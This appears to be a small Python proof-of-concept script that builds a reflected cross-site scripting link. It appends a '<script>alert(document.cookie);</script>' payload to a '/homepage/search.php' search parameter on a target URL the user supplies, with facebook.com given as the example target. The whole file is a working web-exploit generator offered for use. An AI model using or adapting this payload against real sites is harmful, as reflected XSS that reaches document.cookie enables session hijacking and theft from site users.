import sys

def printhelp(name):
    print("Trigger cookie reflected XSS link:")
    print("[-] Usage: %s <url>" %name)
    print("""[-] Example: %s "https://www.facebook.com" """ %name)

def get_link(url):
    path = "/homepage/search.php"
    payload = "?search=<script>alert(document.cookie);</script>&search_for=user"
    print('->"'+url + path + payload+'"')

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        printhelp(sys.argv[0])
        sys.exit(-1)
    get_link(url)